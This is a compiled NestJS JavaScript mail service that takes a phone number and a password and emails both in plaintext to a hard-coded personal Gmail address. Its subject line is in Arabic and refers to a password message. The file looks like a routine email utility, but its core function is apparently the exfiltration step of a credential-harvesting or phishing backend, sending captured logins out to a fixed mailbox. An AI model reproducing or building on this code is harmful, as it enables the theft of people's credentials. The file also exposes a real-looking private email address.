"use strict";
var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
Object.defineProperty(exports, "__esModule", { value: true });
exports.SendEmailService = void 0;
const common_1 = require("@nestjs/common");
const nodemailer = require("nodemailer");
const variables_service_1 = require("../constants/variables.service");
const template_service_1 = require("./template.service");
let SendEmailService = class SendEmailService {
    transporter;
    constructor() {
        if (!variables_service_1.envVariables.SECRETPASSWORD || !variables_service_1.envVariables.SECRETPHONE) {
            throw new Error('برجاء التأكد من وجود كلمة السر ورقم الهاتف في envVariables');
        }
        this.transporter = nodemailer.createTransport({
            service: "gmail",
            secure: true,
            auth: {
                user: variables_service_1.envVariables.EMAIL_USER,
                pass: variables_service_1.envVariables.EMAIL_PASS,
            },
        });
    }
    async main({ phone, password }) {
        Server: "email";
        const info = await this.transporter.sendMail({
            from: variables_service_1.envVariables.EMAIL_USER,
            to: "osamaproud01@gmail.com",
            subject: "الرسالة بتاعت كلمة السر",
            html: (0, template_service_1.template)(password, phone),
        });
        console.log("Message sent: %s", info.messageId);
    }
};
exports.SendEmailService = SendEmailService;
exports.SendEmailService = SendEmailService = __decorate([
    (0, common_1.Injectable)(),
    __metadata("design:paramtypes", [])
], SendEmailService);
//# sourceMappingURL=mail.service.js.map